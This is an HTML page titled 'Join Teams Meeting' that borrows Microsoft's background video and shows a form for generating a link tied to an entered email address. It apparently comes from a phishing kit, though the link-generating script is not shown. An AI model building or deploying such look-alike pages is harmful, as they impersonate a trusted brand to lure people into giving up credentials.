<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join Teams Meeting</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="shortcut icon" href="data:image/png;base64," type="image/x-icon">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        video {
            position: fixed;
            top: 50%;
            left: 50%;
            min-width: 100%;
            min-height: 100%;
            width: auto;
            height: auto;
            z-index: -1;
            transform: translate(-50%, -50%);
            object-fit: cover;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 2.5rem;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
            position: relative;
            z-index: 1;
        }
        h1 { font-size: 1.5rem; margin-bottom: 1.5rem; color: #333; }
        input[type="email"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 1rem;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
        }
        input[type="email"]:focus {
            border-color: #5864A6;
            box-shadow: 0 0 0 2px rgba(88, 100, 166, 0.2);
        }
        button {
            width: 50%;
            padding: 10px;
            background-color: #5864A6;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
        }
        button:hover { background-color: #5864A6; }
        #linkArea {
            margin-top: 1.5rem;
            padding: 10px;
            background: #e9ecef;
            border-radius: 4px;
            word-break: break-all;
            display: none;
        }
        #linkArea a { color: #007bff; text-decoration: none; font-weight: bold; }
        #linkArea a:hover { text-decoration: underline; }
        .logo{
            width: 100px; height: 100px;
        }
    </style>
</head>
<body>
    <video playsinline="" autoplay="" muted="" loop="" poster="">
                 <source src="https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/298520-maria-sizzle-0x540-2160k" type="video/webm"> <source src="https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/298520-maria-sizzle-0x540-2160k" type="video/mp4"> </video>
    <div class="container">
        <img class="logo" src="img/logo.png" alt="">
        <h1>Generate Your Link</h1>
        <input type="email" id="user" name="user" placeholder="Enter email address" required>
        <button id="generateBtn">Generate link</button>
        <div id="linkArea">
            <p>Your Link:</p>
            <a id="generatedLink" href="#" target="_blank"></a>
        </div>
    </div>

